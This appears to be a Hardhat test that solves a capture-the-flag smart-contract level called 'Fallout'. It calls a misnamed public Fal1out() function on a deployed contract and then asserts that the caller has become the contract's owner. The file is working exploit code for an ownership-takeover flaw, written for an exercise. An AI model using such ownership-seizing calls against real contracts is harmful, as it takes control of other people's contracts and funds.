import { TransactionResponse } from "@ethersproject/providers";
import { expect } from "chai";
import { ethers } from "hardhat";

describe("Fallout", function () {
  it("Pwn", async function () {
    const ABI = ["function Fal1out() payable", "function owner() view returns (address payable)"];
    const ADDRESS = "0xe46c1DA1A4BA23B4bbC3c03134548F381009a796";
    const contract = await ethers.getContractAt(ABI, ADDRESS);
    const [signer] = await ethers.getSigners();

    console.log("Claiming ownership...");
    const tx: TransactionResponse = await contract.Fal1out();
    await tx.wait();
    const owner: string = await contract.owner();
    console.log(`owner(): ${owner}`);
    expect(owner).to.equal(signer.address);
  });
});
